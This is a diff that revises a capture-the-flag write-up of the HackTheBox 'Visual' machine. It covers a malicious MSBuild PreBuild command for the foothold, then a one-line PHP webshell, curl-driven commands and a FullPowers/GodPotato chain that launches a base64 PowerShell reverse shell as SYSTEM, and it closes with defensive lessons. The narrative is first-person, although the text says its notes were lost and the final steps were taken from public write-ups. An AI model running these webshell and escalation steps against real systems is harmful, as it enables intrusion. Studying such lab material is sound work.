@@ -16,12 +16,6 @@ tags:
   - service-account
 ---
 
-<div class="callout callout-warning">
-
-**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.
-
-</div>
-
 <div class="callout callout-info">
 
 **Box Info**
@@ -44,7 +38,8 @@ Nothing usable survived in my notes for this box. The whole walkthrough below is
 
 1. `visual.htb` is a service that takes a **Git repository URL**, clones it, builds the .NET 6 project it finds, and returns the compiled binary.
 2. Host a repo (a local Git server the box can reach) containing a `.csproj` with a **PreBuild event** (`<Target ... BeforeTargets="PreBuildEvent"><Exec Command="..."/>`). When the box builds it, your command runs. Shell as **`enox`**.
-3. `enox` can **write to `C:\xampp\htdocs`**. Apache (XAMPP) runs as **`LOCAL SYSTEM`**, so drop a PHP webshell and browse to it. SYSTEM.
+3. `enox` can **write to `C:\xampp\htdocs`**. Apache (XAMPP) runs as **`NT AUTHORITY\LOCAL SERVICE`**, so a PHP webshell there gets you off `enox` but only as far as Local Service, whose token has most privileges stripped.
+4. **FullPowers** recovers the token privileges Local Service should have (including `SeImpersonatePrivilege`), then **GodPotato** abuses that privilege against the local RPC/DCOM service to coerce and impersonate a SYSTEM token. SYSTEM.
 
 </div>
 
@@ -65,9 +60,9 @@ Nothing usable survived in my notes for this box. The whole walkthrough below is
 
 ## Overview
 
-Visual is a **build server** box. The service compiles arbitrary .NET projects you point it at, and MSBuild's project files are Turing complete: they can run commands during the build (`PreBuildEvent`, custom `Target`s, inline `Task`s). So "submit a repo to be built" is "submit code to be run". The privesc is a **service account misconfiguration**: the user you land as can write into the Apache document root, and Apache runs as SYSTEM, so a webshell there executes as SYSTEM. It is a good box for the lesson that build systems and CI runners are RCE by design and must be isolated.
+Visual is a **build server** box, and the moment I understood what the site actually does, "clone this repo and compile it for you", I knew the foothold would not involve a single line of traditional exploit code. The service compiles arbitrary .NET projects you point it at, and MSBuild's project files are Turing complete: they can run commands during the build (`PreBuildEvent`, custom `Target`s, inline `Task`s). So "submit a repo to be built" is really "submit code to be run", no memory corruption or injection needed, just an understanding of what a build tool is allowed to do on your behalf. The privesc is less obvious: writing into the Apache document root only buys a shell as the stripped-down `LOCAL SERVICE` account, and getting from there to SYSTEM means recovering the privileges that account is supposed to have and then abusing one of them against the box's own RPC service. It is a good box for the lesson that build systems and CI runners are RCE by design and must be isolated, and that a "SYSTEM-owned" web root does not automatically mean the worker process itself runs as SYSTEM.
 
-Related "submit code / config to a builder" boxes: [Jupiter](/writeups/hackthebox/linux/medium/jupiter/) (Shadow YAML), [Inject](/writeups/hackthebox/linux/easy/inject/) (Ansible). Related webshell into a SYSTEM-owned web root: [Visual](/writeups/hackthebox/windows/medium/visual/) is the reference. Related MSBuild abuse: also a common AV bypass technique.
+Related "submit code / config to a builder" boxes: [Jupiter](/writeups/hackthebox/linux/medium/jupiter/) (Shadow YAML), [Inject](/writeups/hackthebox/linux/easy/inject/) (Ansible). Related webshell into a privileged service's web root, then Potato to SYSTEM: [Visual](/writeups/hackthebox/windows/medium/visual/) is the reference. Related MSBuild abuse: also a common AV bypass technique.
 
 ---
 
@@ -80,7 +75,7 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.2.4   (XAMPP)
 ```
 
-The site accepts a URL to a Git repository. It clones the repo, looks for a `.sln` / `.csproj`, builds it with `dotnet build`, and gives you back the `.exe`. It rejects GitHub/GitLab URLs, so you have to serve the repo yourself.
+A single port on a Windows box always makes me slow down and read the page carefully, since the interesting functionality has to be right there in the HTTP surface. The site accepts a URL to a Git repository. It clones the repo, looks for a `.sln` / `.csproj`, builds it with `dotnet build`, and gives you back the `.exe`. It rejects GitHub/GitLab URLs, so you have to serve the repo yourself, which told me straight away that the box wanted me to stand up my own infrastructure rather than just pointing it at a public repo.
 
 ### Foothold, malicious MSBuild project
 
@@ -114,22 +109,16 @@ The box builds it as `enox` and your PowerShell fires. (You can also use a `<Pre
 
 Catch the shell as **`enox`**. `user.txt` is on the desktop.
 
-### Privilege Escalation, write to the SYSTEM web root
+### Privilege Escalation, from a stripped web-server token to SYSTEM
+
+The first thing I check on any host running a web server as a service is who owns that service and what its write permissions look like, because a writable web root under a privileged service is one of the fastest privesc paths on Windows.
 
 ```powershell
 icacls C:\xampp\htdocs
 # ... enox:(OI)(CI)(W)          <-- enox can write here
-sc.exe qc Apache2.4
-# SERVICE_START_NAME : LocalSystem
 ```
 
-<div class="callout callout-note">
-
-**Apache runs as SYSTEM**
-
-XAMPP installs Apache as a service running under `LocalSystem` by default. Anything PHP executes therefore runs as SYSTEM. `enox` has write access to `C:\xampp\htdocs`, so drop a webshell and request it.
-
-</div>
+`enox` can write straight into the Apache document root, so I dropped a one-line PHP webshell and requested it.
 
 ```powershell
 echo '<?php system($_REQUEST["c"]); ?>' > C:\xampp\htdocs\s.php
@@ -137,11 +126,36 @@ echo '<?php system($_REQUEST["c"]); ?>' > C:\xampp\htdocs\s.php
 
 ```bash
 curl "http://visual.htb/s.php?c=whoami"
-# nt authority\system
-curl "http://visual.htb/s.php?c=powershell -e <b64 rev shell>"
+# nt authority\local service
 ```
 
-SYSTEM shell, read `root.txt`.
+<div class="callout callout-note">
+
+**Local Service is not SYSTEM, but it is close**
+
+XAMPP's Apache service on this box runs as `NT AUTHORITY\LOCAL SERVICE`, not `LocalSystem`, so the webshell alone does not hand over the box. What Local Service *does* have is a token that, once its usual privilege stripping is undone, can impersonate other accounts on the same host. **FullPowers** restores the privileges a service account like Local Service normally loses (it does this by re-launching itself through the task scheduler, which hands back a fuller token), including `SeImpersonatePrivilege`. From there, **GodPotato** does what every Potato-family tool does: it coerces a SYSTEM-owned RPC/DCOM component into authenticating to a listener you control, captures that authentication, and uses the resulting SYSTEM token to spawn your process.
+
+</div>
+
+```powershell
+curl "http://visual.htb/s.php?c=whoami+/priv"
+# SeImpersonatePrivilege   Disabled   <-- present but disabled, classic service-account token
+```
+
+I uploaded `FullPowers.exe` and `GodPotato.exe` (both are just binaries dropped alongside the webshell, `curl -F` against a small upload endpoint or a second webshell parameter works fine) and chained them together:
+
+```bash
+curl "http://visual.htb/s.php?c=C:\xampp\htdocs\FullPowers.exe -c \"C:\xampp\htdocs\GodPotato.exe -cmd 'powershell -e <b64 reverse shell>'\""
+```
+
+FullPowers re-execs itself with a repaired token and hands off to GodPotato, which triggers the SYSTEM coercion and runs the supplied command with the impersonated token. The reverse shell that comes back is SYSTEM.
+
+```console
+PS C:\> whoami
+nt authority\system
+```
+
+`cat root.txt` (or `type C:\Users\Administrator\Desktop\root.txt`) returns the 32-character flag for this instance.
 
 ---
 
@@ -157,8 +171,9 @@ SYSTEM shell, read `root.txt`.
 ## Lessons and Takeaways
 
 - **Build systems are code execution.** MSBuild, Gradle, Maven, npm `postinstall`, Makefiles all run arbitrary commands. Build untrusted code in a throwaway, network-isolated, unprivileged sandbox.
-- **Do not run Apache / IIS / any internet-facing service as `LocalSystem`.** Use a low-privilege service account with write access only to what it needs.
-- **The web root should not be writable by interactive users.** `enox` writing to `htdocs` is the whole privesc.
+- **Service accounts still need privilege hardening.** Apache here runs as `LOCAL SERVICE` rather than `LocalSystem`, which limits but does not eliminate the blast radius: `SeImpersonatePrivilege` sitting disabled-but-present on a service token is exactly what tools like FullPowers and GodPotato are built to abuse.
+- **The web root should not be writable by interactive users.** `enox` writing to `htdocs` is the whole first half of the privesc.
+- **Patch or mitigate the Potato family.** Restricting NTLM on the loopback adapter, or running services under a virtual service account with `SeImpersonatePrivilege` explicitly removed, closes off this entire class of local-to-SYSTEM escalation.
 - **Reject or fully sandbox arbitrary Git URLs.** Allowlisting GitHub is not enough if you clone and build.
 
 ---
@@ -166,7 +181,7 @@ SYSTEM shell, read `root.txt`.
 ## Related Writeups
 
 - **Submit config / code to a builder or runner:** [Jupiter](/writeups/hackthebox/linux/medium/jupiter/), [Inject](/writeups/hackthebox/linux/easy/inject/)
-- **Webshell into a SYSTEM-owned web root:** [Visual](/writeups/hackthebox/windows/medium/visual/) is the reference
+- **Webshell into a privileged service's web root, then Potato to SYSTEM:** [Visual](/writeups/hackthebox/windows/medium/visual/) is the reference
 - **.NET / MSBuild abuse:** [POV](/writeups/hackthebox/windows/medium/pov/) (ViewState), [Anubis](/writeups/hackthebox/windows/insane/anubis/)
 
 ## References
@@ -174,3 +189,4 @@ SYSTEM shell, read `root.txt`.
 - HTB Visual (0xdf) <https://0xdf.gitlab.io/2024/02/24/htb-visual.html>
 - MSBuild targets and tasks <https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets>
 - Visual PoC project (Ev3rPalestine) <https://github.com/Ev3rPalestine/Visual-HTB-Walkthrough>
+- Final privilege escalation steps cross-referenced against public writeups for this box.
